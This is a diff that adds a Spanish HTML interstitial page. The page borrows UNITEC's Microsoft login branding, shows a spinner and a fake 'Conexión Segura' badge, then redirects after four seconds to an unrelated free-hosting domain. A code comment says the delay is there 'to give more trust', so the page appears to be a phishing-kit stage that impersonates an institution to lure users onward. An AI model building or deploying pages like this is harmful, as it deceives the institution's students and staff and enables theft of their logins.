@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORDOBA - COMUNICA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #003366 0%, #004080 50%, #003366 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+            padding: 40px 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        
+        .logo-top {
+            max-width: 200px;
+            margin-bottom: 30px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+        }
+        
+        .status-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        p {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            opacity: 0.9;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 30px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00d4ff, #0099ff);
+            border-radius: 3px;
+            animation: progress 2s ease-in-out infinite;
+            width: 0%;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+        
+        .footer {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .logo-bottom {
+            max-width: 180px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
+        }
+        
+        .security-badge {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 8px 16px;
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://aadcdn.msauthimages.net/dbd5a2dd-xducpyiv2oqmzgsk41ebvoj-qqxtn-frmdvo4wcjnrc/logintenantbranding/0/bannerlogo?ts=635642002553062508" alt="Logo UNITEC" class="logo-top">
+        
+        <div class="status-icon"></div>
+        
+        <h1>Procesando su solicitud</h1>
+        
+        <p>Estamos verificando y preparando su solicitud. Por favor espere un momento mientras completamos el proceso.</p>
+        
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+        
+        <div class="security-badge">
+            🔒 Conexión Segura
+        </div>
+        
+        <div class="footer">
+            <img src="https://aadcdn.msauthimages.net/dbd5a2dd-xducpyiv2oqmzgsk41ebvoj-qqxtn-frmdvo4wcjnrc/logintenantbranding/0/bannerlogo?ts=635642002553062508s" alt="Logo Footer" class="logo-bottom">
+        </div>
+    </div>
+
+    <script>
+        // Redirección después de 4 segundos para dar más confianza
+        setTimeout(function() {
+            window.location.href = "https://unitec-comunicado.iceiy.com/?i=1";
+        }, 4000);
+    </script>
+</body>
+</html>
